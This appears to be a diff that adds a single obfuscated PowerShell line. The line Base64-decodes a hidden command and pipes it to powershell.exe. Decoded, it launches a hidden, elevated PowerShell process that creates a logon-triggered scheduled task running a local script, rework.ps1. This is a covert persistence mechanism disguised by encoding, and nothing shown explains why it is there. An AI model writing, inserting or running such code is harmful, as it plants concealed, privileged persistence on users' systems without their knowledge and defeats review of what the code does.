@@ -1,0 +1,1 @@
+[System.Text.Encoding]::UTF8.GetString(([System.Convert]::FromBase64String("U3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsIC1XaW5kb3dTdHlsZSBoaWRkZW4gLUFyZ3VtZW50TGlzdCAoIlNDSFRBU0tTIC9DUkVBVEUgL1NDIE9OTE9HT04gL1ROICdNeVRhc2tzXERhaWx5JyAvVFIgJ1Bvd2VyU2hlbGwgLUZpbGUgIEM6XFByb2dyYW1QYXRoc1xyZXdvcmsucHMxJyIpIC12ZXJiIFJ1bkFz")|?{$_}))  | powershell.exe
